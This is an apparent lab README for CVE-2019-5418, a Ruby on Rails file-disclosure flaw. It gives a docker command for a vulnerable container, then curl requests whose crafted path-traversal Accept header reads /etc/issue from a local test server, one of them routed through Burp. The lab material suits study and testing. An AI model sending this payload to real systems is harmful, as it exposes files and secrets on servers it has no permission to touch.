# TITLE OF VULN
## Subtitle / what it does
Ruby on Rails - arbitrary file read

### Run in docker:
```
cd 3-ruby-rails
docker run -p 3000:3000 0snug0/cve-2019-5418
```

### Run in docker:
```
curl -i -s -k  -X $'GET' \
    -H $'Host: 127.0.0.1:3000' -H $'Accept-Encoding: gzip, deflate' -H $'Accept: .././.././.././.././.././.././.././.././.././.././etc/issue{{' -H $'Accept-Language: en' -H $'User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)' -H $'Connection: close' \
    $'http://127.0.0.1:3000/chybeta'
```

### Proxy via Burp:
```
curl -i -s -k  -X $'GET' \
    -H $'Host: 127.0.0.1:3000' -H $'Accept-Encoding: gzip, deflate' --proxy http://127.0.0.1:8080 -H $'Accept: .././.././.././.././.././.././.././.././.././.././etc/issue{{' -H $'Accept-Language: en' -H $'User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)' -H $'Connection: close' \
    $'http://127.0.0.1:3000/chybeta'
```

### Explanation
There is a File Content Disclosure vulnerability in Action View <5.2.2.1, <5.1.6.2, <5.0.7.2, <4.2.11.1 and v3 where specially crafted accept headers can cause contents of arbitrary files on the target system's filesystem to be exposed.

![image](https://user-images.githubusercontent.com/31791455/140390131-fd85589a-f379-4fb7-b967-e060838742a5.png)


### References and recommended reading
https://chybeta.github.io/2019/03/16/Analysis-for%E3%80%90CVE-2019-5418
![image](https://user-images.githubusercontent.com/31791455/140390169-a646a665-9b95-4540-8f9b-93f6e6e37709.png)


### Credits:
https://gist.github.com/ajxchapman/6ed7bf599f29a62cdbab7b6e95eebed9
https://github.com/mpgn/CVE-2019-5418

